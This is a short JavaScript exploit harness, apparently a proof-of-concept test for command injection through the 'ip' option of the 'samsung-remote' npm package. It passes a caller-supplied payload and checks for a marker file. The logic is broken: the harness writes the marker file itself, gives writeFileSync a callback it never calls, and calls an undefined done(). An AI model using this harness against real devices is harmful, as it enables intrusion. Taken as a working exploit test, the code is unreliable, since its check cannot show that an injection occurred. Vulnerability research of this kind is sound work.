function exploitFunction(payload) {
  const SamsungRemote = require("samsung-remote");
  const fs = require("fs");
  const path = "./samsung-remote";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var remote = new SamsungRemote({ ip: payload });

  remote.isAlive(function (err) {
    if (err) {
      console.error("Error checking isAlive:", err);
      return;
    }

    fs.writeFileSync(path, "", function (err) {
      if (err) {
        console.error("Error writing to file:", err);
        return;
      }

      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlink(path, function (err) {
        if (err) {
          console.error("Error unlinking file:", err);
          return;
        }

        // Call done to signal the test completion
        done();
      });
    });
  });
}

module.exports = { exploitFunction };